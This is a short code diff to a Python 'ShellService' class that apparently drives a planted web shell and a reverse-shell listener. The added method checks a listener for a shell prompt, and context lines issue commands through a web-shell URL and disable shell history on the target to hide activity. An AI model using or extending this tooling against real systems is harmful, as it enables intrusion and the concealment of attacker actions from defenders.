@@ -36,6 +36,14 @@ class ShellService:
         response = requests.get(f'{self.web_shell_url}?omega={os_check_code}&php', headers=DEFAULT_HEADERS)
         return 'OMEGA_HOST_OS = LINUX' in response.content.decode().upper()
 
+    def is_rev_shell(self, shell: listen) -> bool:
+        data_received = shell.recv(timeout=0.5)
+        shell.unrecv(data_received)
+
+        if (not b'$' in data_received and not b'Windows' in data_received):
+            return False
+        return True
+
     def upgrade_shell(self, shell: listen):
         shell.sendline(b'export HISTFILE=/dev/null') # Avoid history
         # Get pty
